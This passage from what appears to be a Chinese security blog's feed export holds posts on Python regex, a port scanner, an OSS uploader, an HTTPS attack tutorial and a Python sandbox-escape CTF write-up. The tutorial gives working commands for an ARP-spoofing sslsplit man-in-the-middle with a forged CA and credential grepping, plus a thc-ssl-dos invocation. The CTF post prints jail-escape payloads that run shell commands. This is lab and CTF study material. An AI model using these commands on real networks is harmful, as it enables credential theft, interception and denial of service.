匹配封闭括号中正则表达式（RE），并保存为子组\d 匹配任何数字，和[0-9]一样（\D是\d的反义：任何非数字）\w 匹配任何数字字母字符，和[A-Za-z0-9_]相同(\W是\w的反义)\s 匹配任何空白符，和[\n\t\r\v\f]相同（\S是\s的反义）\b 匹配单词边界(\B是\b的反义)\nn 匹配已保存的子组（参考(…)）如price:\16\c 逐一匹配特殊字符c（即，取消它的特殊含义，按字面匹配）\A（\Z）匹配字符串的起始（结束） 一些说明 （1）用管道符号(|)匹配多个正则表达式（2）匹配除换行符外任意一个单个的字符（.）（3）从字符串的开头或结尾或单词边界开始匹配（^ $或\A \Z \b \B）（4）创建字符类（[]）（5）指定范围（-）和否定（^）（6）使用闭包操作符（* + ？ {}）实现多次出现/重复匹配（7）？的两种含义： 表示匹配出现0或1次； 紧跟在表示重复的元字符后面时（如+?），表示要求搜索引擎匹配的字符串越短越好。(*+?{m,n})尽量“吸收”更多的字符，这叫“贪心”。 （7）特殊字符表示、字符集 \d表示十进制数字（\D表示非十进制数字） \w表示整个字符数字的字符集（\W） \s表示空白字符（\S） （8）用圆括号（()）组建组 、()的功能：对正则表达式进行分组；匹配子组。 对正则表达式进行分组可以实现用不同的正则表达式去匹配字符串，或重复整个正则表达式多次。 使用子组匹配是为了能够提取匹配模式的内容，Python的re支持此功能。 python的re模块 re模块的用法 1234567891011import restr = "xxxflag&#123;sss&#125;sss"# #用法1：re_flag = re.compile(r'flag&#123;\w+?&#125;')flag = re_flag.findall(str)print(flag)#用法2：flag =re.findall(r'flag&#123;\w+?&#125;',str)print(flag) 贪心匹配和非贪心匹配 贪心匹配：正则表达尽可能多的匹配元素 非贪心匹配：正则表达式尽可能少的匹配元素 match和search的区别 match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，返回None search匹配整个字符串，直到找到一个匹配 分组匹配（优点在说明第（8）点） python中常用的正则表达式处理函数 re.match() 尝试从字符串的起始位置匹配一个模式，如果不是起始位置就匹配成功，match返回none 函数语法 re.match(partten,string,flags=0) 函数参数说明 使用group(num)或groups()匹配对象函数来获取匹配表达式 re.search() 扫描整个字符串并返回第一个成功的匹配 函数语法 re.search(pattern,string,flags=0) 使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 re.sub()用于替换字符串中的匹配项 函数语法 re.sub(pattern,repl,string,count=0) 函数参数说明 使用实例(包含是否使用repl参数的，repl可能是个函数) re.compile() 用于编译正则表达式，生成一个正则表达式对象供match和search两个函数使用 函数语法 re.compile(pattern[, flags]) 参数说明 使用实例（当匹配成功的时候返回一个match对象） re.findall() 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回一个空列表 函数语法 findall(string[, pos[, endpos]]) 函数参数 使用实例（用compile函数生成正则表达式对象） re.finditer() 和findall类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回 函数语法 re.finditer(pattern, string, flags=0) 函数参数 使用实例(用for循环迭代输出) re.split() split 方法按照能够匹配的子串将字符串分割后返回列表 函数语法 re.split(pattern, string[, maxsplit=0, flags=0]) 函数参数 使用实例（对于一个找不到匹配的字符串，split不会分割） 正则表达式对象 re.RegexObject (re.compile() 返回的就是一个正则表达式对象) group()返回被RE匹配的字符串 start() 返回开始匹配的位置 end() 返回匹配结束的位置 span()返回一个元组包含（开始，结束）的位置]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简易端口扫描器]]></title>
    <url>%2F2018%2F06%2F14%2F%E7%AE%80%E6%98%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8%2F</url>
    <content type="text"><![CDATA[只是一次简单的课程设计，通过Python实现端口扫描器的功能，附加ping扫描以及简单的banner获取，支持导出扫描结果。 程序运行实例 打印装逼信息： 扫描实例： 具体用法程序中有说明 程序说明 程序中默认扫描一些常见的端口、支持用户设置端口、支持多端口扫描、支持多IP扫描、支持网段存活主机发现、支持导出。 通过发送ping包，根据返回包的TTL值判断主机是否存活，关键代码如下： 123456789101112131415161718192021def run(self): try: cmd = ["ping", "-&#123;op&#125;".format(op=self.get_os()), "1", self.ip_pre] output = os.popen(" ".join(cmd)).readlines() except: return False if lock.acquire(): flag = False for line in list(output): if not line: continue if str(line).upper().find("TTL") &gt;=0: flag = True break if flag: print "[+] IP: %s is OK " % self.ip_pre ip_str.append(self.ip_pre) lock.release() return True 通过socket建立tcp全连接来判断端口开放信息以及banner信息的抓取，关键代码如下： 123456789101112131415161718192021def Ping(self, Port): global OpenPort, lock, Timeout sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.settimeout(Timeout) address = (self.IP, Port) try: sock.connect(address) ready = select.select([sock],[],[],1) except: return False if lock.acquire(): OpenPort.append(str(Port)) ScanIP_list.append(self.IP) if ready[0]: print "IP:%s Port:%d Open " % (self.IP, Port) +sock.recv(4096) sock.close() else: print "IP:%s Port:%d Open " % (self.IP, Port) + "Unknow!\n" sock.close() lock.release() return True 通过队列来判断扫描目标的端口列表是否为空，通过判空来控制在端口扫描的时候不会漏扫，还有就是在多IP端口扫描的时候避免出现误扫IP的状况，关键代码如下： 1234def run(self): while not self.SingleQueue.empty(): p = self.SingleQueue.get() self.Ping(p) 调用cmd模块来进行交互，用户通过这个模块来设置线程（在中程序中控制在1-5000，可以修改）、设置连接超时时间、设置端口、进行端口扫描、ping扫描等。关键代码如下：（贴出设置端口、单IP扫描、ping扫描的代码，具体代码请看源码） 1234567891011121314151617def do_port(self, argv): global PortList PortList = [] ListTmp = argv.split(' ') for port in ListTmp: if port.find("..") &lt; 0: if not port.isdigit(): print "Input error!" return False PortList.append(int(port)) else: RangeLst = port.split("..") if not (RangeLst[0].isdigit() and RangeLst[1].isdigit()): raise ValueError exit() for i in range(int(RangeLst[0]), int(RangeLst[1])): PortList.append(i) 123456789101112131415161718192021def do_scan(self, argv): print "Start Time %s" % time.ctime() + '\n' global nThread, PortList, strIP, ScanIP_list, OpenPort del ScanIP_list[:] del OpenPort[:] ThreadList = [] try: strIP = socket.gethostbyname(str(argv)) except: print "Input error!" return False SingleQueue = GetQueue(PortList) if PortList != None: for i in range(0, nThread): t = ScanThreadSingle(strIP, SingleQueue) ThreadList.append(t) for t in ThreadList: t.start() for t in ThreadList: t.join() print '\n' + "End Time %s" % time.ctime() 1234567891011121314151617def do_ping(self, argv): global commandargs ThreadList = [] print "Start Time %s" % time.ctime() + '\n' commandargs = str(argv) print "[+] Input is %s " % commandargs + '\n' args = "".join(commandargs) ip_prefix = '.'.join(args.split('.')[:-1]) for i in range(1,255): ip = '%s.%s' % (ip_prefix,i) s = PING(ip) ThreadList.append(s) for s in ThreadList: s.start() for s in ThreadList: s.join() print '\n' + "End Time %s" % time.ctime() 这些就是整个程序中核心的几个模块，具体代码请看源码。 总结 此次设计参考了P牛早期的一个设计以及Python线程锁的处理方法。实现的功能比较单一，还可以添加SYN半连接扫描、UDP扫描、僵尸扫描等功能；但是由于Windows底层的原因，利用Python在Windows上构造数据包有些困难；在linux上可以通过scapy进行原始数据包的构造与发送，通过网络流量中的一些特征来判断。一些扫描脚本可以看四层发现中的一些脚本。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里云OSS智能上传图床]]></title>
    <url>%2F2018%2F06%2F13%2F%E9%98%BF%E9%87%8C%E4%BA%91OSS%E5%82%A8%E5%AD%98%E6%99%BA%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A%2F</url>
    <content type="text"><![CDATA[背景：由于现在云储存的发展，许多东西储存到云端更加方便，比如：图片；网上最多的工具就是七牛云以及上传利用工具，但是七牛云需要手持身份证实名认证，所以放弃；其次没有关注腾讯云，所以选择了阿里云，其实优惠力度还是腾讯的比较大；为了避免麻烦，就没有在做迁移了，使用过的可以与阿里云关联的极简图床，但是我们还是需要一张张的拖图片，然后复制makedown连接，这样还是太麻烦了，有一天看到大佬写了一个腾讯云的工具，所以，在学习之余写了这个工具。 程序流程图如下： 功能实现图片截图以后，从粘贴板获取图片保存到本地Image文件夹下 使用win32clipboard，win32con，PIL模块 1234import win32conimport win32clipboard as wfrom PIL import ImageGrabfrom PIL import Image 123im = ImageGrab.grabclipboard() #从粘贴板获取内容 if isinstance(im,Image.Image): #判断是不是图片 name = str(time.time()) + ".png" 获取到图片以后判断是否为图片然后保存到本地 这里说明一点：PIL模块是处理图像的，使用PIL处理过图像以后是使图像变小，有利于进行云储存 将图片上传以后的生成的访问地址添加到粘贴板 使用win32clipboard，win32con模块 12345def setText(self,aString): w.OpenClipboard() w.EmptyClipboard() w.SetClipboardData(win32con.CF_TEXT,aString) w.CloseClipboard() 这里存在一个坑：win32con.CF_TEXT这里在Python2中会将所有的字符串添加到粘贴板，早Python3中只会添加首个字符，解决办法：将CF_TEXT替换为CF_UNICODETEXT，如果在Python2中使用CF_UNICODETEXT会出现添加到粘贴板的字符是乱码 上传图片到OSS 使用oss2、shutil 模块，oss2是官方提供的Python OSS SDK，支持Python2、3 123456def upload(self,file_name,name): bucket = oss2.Bucket(oss2.Auth(self.acc_id,self.acc_secret),self.endpoint,self.bucket_name) data = bucket.put_object_from_file(key='Blog/'+ name,filename='image/'+ name, headers=None, progress_callback=None) str = "https://xxxxxx.xx/" + name shutil.rmtree('image') 这里要在外部的 config文件中配置好阿里云提供的：Access Key ID、Access Key Secret、bucket_name、endpoint 说明：由于阿里云的SDK默认不支持文件夹，目录的概念，所以通过添加’/‘来表示在那个文件夹下；又由于没有返回文件访问连接地址的接口，所以通过固有的形式进行组合 shutil模块进行清空本地存放已经上传完的的图片（这样会删除文件夹，比遍历更加快速），这一点看个人了，可有可无，也可以使用os模块进行相应的操作。 设置阿里云OSS的接口信息 通过外部的config文件导入 123456789101112131415try: infoDict = &#123;&#125; with open("config.conf","r") as file: ApiInfo = file.readlines() for info in ApiInfo: try: if info != "\n" and info != "": tmp = info.split("=") infoDict[tmp[0].strip()] = tmp[1].strip() except Exception as e: print u"[-] 请按照要求配置config.conf" sys.exit() except Exception as e: print u"[-] 请在config.conf中配置阿里云 API信息" sys.exit() 结果示例 参考文章 [OSS SDK-Python]:https://github.com/aliyun/aliyun-oss-python-sdk 更新说明 现在已经修改可以支持python3的环境，详情请看github]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPS攻击]]></title>
    <url>%2F2018%2F06%2F13%2FHTTPS%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[在学习HTTPS攻击之前首先要了解为什么要进行全站HTTPS，全站HTTPS的应用会让链路中的流量加密传输，在HTTP协议明文传输时会发生链路劫持等情况，不论是黑客还是运营商劫持的难度较低，全站HTTPS的应用大大的提高了劫持的难度。在理论上所有的加密都是可以破解的，前提就是看你是否接受这个成本。目前全站HTTPS的应用已经很广泛了，如百度、淘宝等。 HTTPS及其相关知识 HTTPS的作用 CIA(信息安全三要素：机密性、完整性、可用性（HTTPS中是合法用户可以访问权限以内的资源）) 解决的是信息在传输过程中数据被篡改、窃取 加密：对称、非对称、单向 HTTPS攻击方法 降级攻击（HTTPS加密套件是多种加密方式，强制采用低强度的加密方式） 解密攻击（明文、证书伪造） 协议漏洞、实现方法的漏洞、配置不严格（漏洞来源的角度） SSL（全称Secure socket layer） 保证网络通信安全的加密协议 TLS取代SSL v3(由于SSL协议漏洞使得大家认为其漏洞不可软件修复） Heartbleed POODLE BEAST SSL/TLS用于其他场景的传输通道加密 邮件传输（服务器间、客户端与服务期间） 数据库服务器间的通信 LDAP身份认证服务器间的通信 SSL VPN 远程桌面RDP通信过程中的加密和身份认证 WEB通信中的SSL加密 公钥证书（受信任的第三方证书颁发机构签名颁发） Versign Thawte Globalsign Symantec 加密过程 握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输 常见的加密算法 非对称加密算法（适合加密少量的数据） Diffie-Hellman key exchange RSA ECC 对称加密算法（适合加密大量的数据） DES / 3DES AES （主流对称加密算法） IDEA RC4（生命周期短） WEP、TLS/SSL、RDP、secure shell 单向加密算法（hash） MD5 SHA-1 、 SHA-2 SHA-2是TLS1.2唯一支持的单向加密算法 碰撞攻击针对单向加密算法（两个不同的文件生成相同的hash值） SSL的弱点 SSL是不同的对称、非对称、单向加密算法的组合加密实现（加密套件） 服务器端为了提供更好的兼容性，选择支持大量过时的cipher suite 协商过程中强迫降级加密强度 现代处理器计算能力可以在可接受的时间内破解过时加密算法（使用云计算） HTTPS实践在实际中针对目标站点进行探测查看它使用的HTTPS的各种信息 openssl(用户层的一个操作系统命令，直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite) 使用OpenSSL连接探测 openssl s_client -connect www.baidu.com:443 探测目标站点是否支持不安全的加密套件 openssl s_client -tls1_2 -cipher &#39;NULL,EXPORT,LOW,DES&#39; -connect www.baidu.com:443 通过OpenSSL查看不安全的加密套件 openssl ciphers -v &#39;NULL,EXPORT,LOW,DES&#39; 使用SSLScan识别 自动识别SSL配置错误、过期协议、过时cipher suite和hash算法 默认检测CRIME、heartbleed漏洞 测试支持TLS_1.2: sslscan --tlsall www.taobao.com:443 分析证书的详细信息 sslscan --show-certificate --no-ciphersuites www.taobao.com:443 SSLyze探测 Python编写 检测SSL过时版本、存在弱点的cipher suite、是否支持会话恢复 sslyze --regular www.taobao.com 进行信息的探测 nmap脚本探测： sudo nmap --script=ssl-enum-ciphers.nse www.taobao.com 第三方网站扫描： www.ssllabs.com/ssltest 实际攻击的一些方法SSL/TLS中间人攻击（攻击者位于客户端和服务器通信链路中，中间人伪造证书进行加解密进行流量劫持） 这里举个例子，在我们使用代理工具的时候会在浏览器上面设置代理，但在真正的生产环境中我们是不可能将目标的浏览器代理设置为我们的地址，所以就要用到以下的方法 ARP欺骗（最常用的中间人攻击方式） DHCP（四步过程中的第一步一定是广播，谁先相应先给谁确认） 修改网关（手动修改，理论上成立，在现实环境中很难实现） 修改DNS 修改HOSTS（手动修改的这几个在生产环境中实现的条件非常苛刻） ICMP、STP（交换树协议，避免逻辑环路，实现高可用）、OSPF（攻击者和被攻击者出于同一个局域网可以通过攻击一些网络协议） 通过伪造CA证书实现SSL中间人攻击的原理图： 实现SSL中间人攻击的前提（如果SSL中间人攻击以后客户端不提示一些告警信息，用户是很难发现被攻击的） 客户端已经信任伪造证书颁发机构 攻击者控制了合法的证书颁发机构 客户端程序禁止了显示证书错误告警信息 攻击者已经控制客户端，并强制其信任伪造证书 SSLsplit（只需要在攻击者的机器上配置好以后就可以实现对经过的流量解密，也称为HTTPS降级攻击） 透明的SSL/TLS中间人攻击工具 对客户端伪装成服务器，对服务器伪装成普通客户端 伪装服务器需要伪造证书（这里就需要在本地生成一张伪造证书） 支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击（不仅限于https解密） 攻击原理： 监听https流量，更改重定向连接中的location，替换https为http并记录；更改响应内容中的超链接，替换https为http并记录；与用户进行http通信、与服务器进行https通信（记录中本应该是https的请求），从而获取用户信息。 使用openssl伪造中间人的证书： 使用OpenSSL生成证书私钥：openssl genrsa -out ca.key 2048 现在主要使用的就是2048或4096位 利用私钥签名生成证书： openssl req -new -x509 -days 1096 -key ca.key -out ca.crt （这个证书就是伪造的中间人的根证书，伪造信息的时候仅可能的真实） 这里生成的根证书会被sslsplit调用生成通信的证书 开启中间人机器的路由功能（实现真正的路由转发，相当于一个路由器） sudo sysctl -w net.ipv4.ip_forward=1 修改的文件在 /proc/sys/net/ipv4/ip_forward 配置iptables规则实现端口转发调用证书：（因为sslsplit工作在特定的端口上） 查看80、443端口是否被占用 netstat -pantu | grep 80 netstat -pantu | grep 443` 查看当前防火墙中的nat规则 sudo iptables -t nat -L 12345678980端口重定向到8080端口sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080443端口重定向到8443端口sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443将邮件提交代理（MSA）、SMTPS、IMAPS、POP3S重定向到8443端口(可以将加密的流量都转发)sudo iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443sudo iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 使用一台WIN7的虚拟机进行arp欺骗： sudo arpspoof -i ens33 -t 192.168.240.131 -r 192.168.240.2 查看win7的Mac地址发现已经被欺骗 开启sslsplit监听端口（sslsplit的作用是调用伪造证书服务器根证书(ca.crt)针对不同网站签发不同的证书，比如：针对百度伪造类似百度的证书，针对淘宝伪造类似淘宝的证书 ） 建立一个数据存放目录： mkdir -p test1/logdir sudo sslsplit -D -l connect.log -j /home/toml/test1/ -S logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 可以看到生成证书的内容 当被劫持的客户端访问一些做了https的网站，比如淘宝，客户端输入的一些数据经过sslsplit就会被降级解密，理论上是这样，但是现在出现一个尴尬的情况：开启流量转发后arp欺骗也成功了，结果客户端不能正常访问页面。通过分析是https降级失败。 重新进行了https降级，客户端访问页面出现证书不受信任的警告： 在客户端访问做了全站https的淘宝并模拟登陆：（并在logdir目录下查看传输数据的记录） 匹配输入账号密码的字符 sudo grep 123123 * 并查看文件，发现数据都可以明文查看到 HTTPS结合伪造证书降级攻击成功，如果是在真实环境中，为了完美的攻击，可以将伪造的根证书传到客户端浏览器上，这样客户端就不会提示告警信息了。 SSL/TLS拒绝服务攻击 由于SSL在正式加密通信之前，会进行一个协商的机制，协商使用哪种加密套件等，协商成功以后建立SSL的通信，在这个过程中会产生大量的连接，在一定程度上https对会增大服务器的开销。 thc-ssl-dos（一个ssl dos工具，利用的SSL的安全重连接的特性，打死的不是带宽，而是服务器的资源，产生的流量很小，但是效果却很好） SSL协商加密对性能开销增大，大量握手请求会造成拒绝服务 利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL连接请求，造成服务器资源过载 与流量式拒绝服务(占用所有的带宽)攻击不同，thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器 服务器平均可以处理300次/秒SSL握手请求 对SMTPS、POP3S等服务同样有效 thc-ssl-dos 199.233.209.205 2083 –accept 对策 禁用SSL-Renegotiation、使用SSL Accelerator 测试网站是否禁用了SSL-Renegotiation openssl s_client -connect 通过修改thc-ssl-dos代码，可以绕过以上对策 web其他知识点补充 AJAX Asynchronous JavaScript and XML 是一个概念，而非一种新的编程语言，是一组现有技术的组合 通过客户端脚本动态更新页面部分内容，而非整个页面 降低带宽使用，提高速度 提升用户体验 后台异步访问 AJAX组件 JavaScript：ajax的核心组件，使用XMLHTTPRequest对象接口像服务器发起请求，接收并处理服务器响应数据 DHTML 早于AJAX出现，通过JavaScript、css等在客户端修改HTML页面element，缺点是完全依赖于客户端代码修改页面，与服务器的交互由JavaScript applets完成，AJAX的XHR弥补了它的缺点（注册用户） DOM 处理html、xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的properties、method、event 基于AJAX的WEB应用工作流程 XMLHTTPRequest API创建对象xmlhttp进行访问 xml、json、HTML、文本、图片 多个异步请求独立通信，互不依赖 AJAX框架 JQuery Dojo Toolkit Google web tookit(GWT) microsoft AJAX library AJAX攻击面不为大多数人所知 AJAX的安全问题 多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程 AJAX引擎是个权功能的解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可被绕过 服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露 暴露应用程序逻辑 AJAX对渗透测试的挑战 异步请求数量多且隐蔽 触发AJAX请求的条件无规律 手动和截断代理爬网可能产生大量遗漏 AJAX爬网工具 OWASP_ZAP（在攻击模块中） 客户端代码审计 源码 firebug / f12 中的XHR WEB SERVICE 面向服务的架构，便于不同系统集成共享数据和功能 尤其适合不想暴露数据模和程序逻辑而访问数据的场景 无页面 两种类型的WEB service SOAP 传统的web service 开发方法，xml是唯一的数据交换格式 要求安全性的应用更多采用 RESTFUL 更多被采用的轻量web service,JSON是数据交换格式 WEB service安全考虑 使用的api key或session token实现和跟踪身份认证 身份认证有服务器完成，而非客户端 API key、用户名、session token永远不要通过URL发送 RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全 SOPA提供提供强于HTTPS的WS-security机制（在传输层实现数据加密） 使用OAuth 或 HMAX进行身份验证，HMAX身份认证使用C/S共享密钥加密API KEY RESTful应只允许身份认证用户使用PUT、DELETE方法 使用随机token防止CSRF攻击 对用户提交参数过滤，建议部署基于严格白名单的方法 报错信息消毒 直接对象引用应严格身份验证（电商公司已ID作为主索引）]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python沙盒逃逸学习]]></title>
    <url>%2F2018%2F06%2F11%2Fpython%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%2F</url>
    <content type="text"><![CDATA[由于在现在的比赛中出现了沙盒逃逸这种题目，所以就针对python沙盒逃逸学习记录如下。python沙盒逃逸的思路就是题目删除了一些不安全的内建函数，模块导致环境的权限被降低，要利用python语言的特性进行限制的绕过。同时借助前几天赛中的沙盒逃逸演示一下。比赛中涉及的到Python沙盒逃逸往往是利用语言特性来逃逸，但是其实这只是从Python解释器的逃逸，从严格意义上说这是不完全的。从现实意义上来讲更进一步的是利用沙盒的逃逸来控制整个系统，Python的模块通常都是大量C代码的封装，这里面就有未被发现的内存破坏漏洞。所以比赛的题目只是一种思路，更多的还是要结合到实际生产环境中。 实例一 实验脚本：题目的设置，删除一些内建函数（Python语言加载的时候会自动加载系统的内建模块，python2中是builtin，Python3中是builtins） 12345678910111213141516171819202122def make_secure(): UNSAFE = ['open','file','execfile','compile','reload','__import__','eval','input'] for func in UNSAFE: del __builtins__.__dict__[func] from re import findall #Remove dangerous builtinsmake_secure()print 'Go Ahead,Expoit me &gt; ;D'while True: try: print "&gt;&gt;&gt;", #Read user input until the first whitespace character inp = findall('\S+',raw_input())[0] a = None #Set a to the result from executing the user input exec 'a='+inp print '&gt;&gt;&gt;',a except Exception, e: print 'Exception:',e#后面这一段主要是将结果以字符串的形式操作并显示 脚本运行结果：（环境的限制权限非常低）这里其实就是模拟Python的命令行界面，然后进行相应的操作，只是将一些内建函数删除了，所以无法调用系统命令等等 正常情况下Python的使用可以调用OS等模块，就可以进行系统命令的调用和文件操作等等：但是经过限制以后的环境就不可以调用了，因此不能调用系统命令拿到flag 由于删除了对应的内建函数，所以我们要利用Python的特性来绕过这种限制：Python中可以利用file来read文件 但是我们可以发现直接用file这种方式也是被限制了的，所以利用对象的概念，通过元组来加载：（有一个知识点：bases : 类的所有父类构成元素（包含了一个由所有父类组成的元组）） 通过将所有父类组成的元组显示出来以后可以找到file在第40个，然后我们可以通过硬编码的方式调用file加载文件找到flag： ().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read() 实例二 首先还是贴上环境的脚本，前提条件和实例一差不多：（不同的是这里能够执行的内建函数只有输入输出，与实例一不同的还有就是这里不回显数据 ） 1234567891011121314151617181920212223#!/usr/bin/pythonprint "Welcome to my python sandbox! Enter commands below!" banned = ['import','exec','eval','pickle','os','subprocess','kevin sucks','input','banned','cry sum more','sys'] targets = __builtins__.__dict__.keys()targets.remove('raw_input')targets.remove('print')for x in targets: del __builtins__.__dict__[x] while 1: try: print "&gt;&gt;&gt;", data = raw_input() for no in banned: if no.lower() in data.lower(): #将输入的字符转换为小写和banned中的字符转换为小写比较 print("Permission Denied") break exec data except: print '' 环境运行结果如下： 思路与实例一还是一样，都是使用所有父类组成的元组，这里要使用到catch_warnings类（索引在59），进行命令执行 print ().__class__.__bases__[0].__subclasses__() ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;) 经过测试以后发现这里其实可以不用执行59的那个子类，因为没有禁用print函数，当然这里的59这个子类可以用到实例一中进行ls的调用 print ().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read() 实例三 实验环境代码如下：（这里用Python3写的，与前两个相比，这里先删除了两个危险的函数，然后对其他许多函数做了过滤，还对一些字符，如’.’都进行了过滤） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#-*-coding:utf-8-*-#!/usr/bin/python3 import sys, cmd, os del __builtins__.__dict__['__import__']del __builtins__.__dict__['eval'] intro= """ pwnhubcuit pwneverything Rules: -No import -No ... -No flag """ def execute(command): exec(command, globals()) class Jail(cmd.Cmd): prompt = '&gt;&gt;&gt; ' filtered ='\'|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back'.split('|') def do_EOF(self, line): sys.exit() def emptyline(self): return cmd.Cmd.emptyline(self) def default(self, line): sys.stdout.write('\x00') def postcmd(self, stop, line): if any(f in line for f in self.filtered): print("You are a big hacker!!!") print("Go away") else: try: execute(line) except NameError: print("NameError: name'%s' is not defined" % line) except Exception: print("Error: %s" %line) return cmd.Cmd.postcmd(self, stop,line) if __name__ == "__main__": try: Jail().cmdloop(intro) except KeyboardInterrupt: print("\rSee you next time!") 所以这里就没有办法使用前面说的利用子类进行系统的调用，这里通过获取系统函数地址进行绕过： print(getattr(os, &quot;system&quot;)(&quot;ls&quot;)) print(getattr(os, &quot;system&quot;)(&quot;cat flag&quot;)) 以上三个实例就是利用Python作为脚本语言的特性来逃逸 实例四 拿最近一次比赛中的沙盒逃逸来演示一下。 拿到赛题以后nc连接一下并输入一些语句进行测试：（也是许多函数被限制且不回显，经过测试发现是Python2写的环境并且没有过滤‘ . ’） 这里和我们前面的练习不一样，这里必须要调用系统命令ls来看一下存放flag的文件，找到一个和getattr函数类似的函数getattribute print ().__class__.__bases__[0].__getattribute__(&#39;o&#39;+&#39;s&#39;,&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;) 发现可以使用单引号调用参数 ().__class__.__bases__[0].__getattribute__(__import__(&#39;o&#39;+&#39;s&#39;),&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;) 构造第二个payload，尝试使用导入os模块的方法调用系统命令，结果失败，过滤了os: 这个时候我们换一下思路，调用子类中的函数catch_warnings，在第59个，构造paylad: print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s&#39;).read 成功列出了目录，经过测试flag在home/ctf目录下： print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s /home&#39;).read() 然后我们加上getattribute构造payload： print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;c&#39;&#39;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#39;).read() 总结 利用语言特性来进行解释器的逃逸，其实就是绕过python沙盒内部导入模块的白名单；这里我理解为它限制的是语言中最直接的模块、函数的调用，而我们利用的是通过封装的类，以及派生出的子类调用，实现相同的功能。还有不得不说的一点，结合生产环境，通过内存破坏、溢出等方式实现沙盒的的逃逸要理解很多东西，涉及到二进制、fuzzy等等，所以要通过不断的学习才可以综合的利用。由于水平有限，这里只能做到语言解释器的沙盒逃逸，而不是系统层面的。下面给出一个讲利用内存破坏实现Python沙盒逃逸的链接。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>CTF</tag>
        <tag>沙盒逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一次windows缓冲区溢出复现]]></title>
    <url>%2F2018%2F06%2F09%2F%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%2F</url>
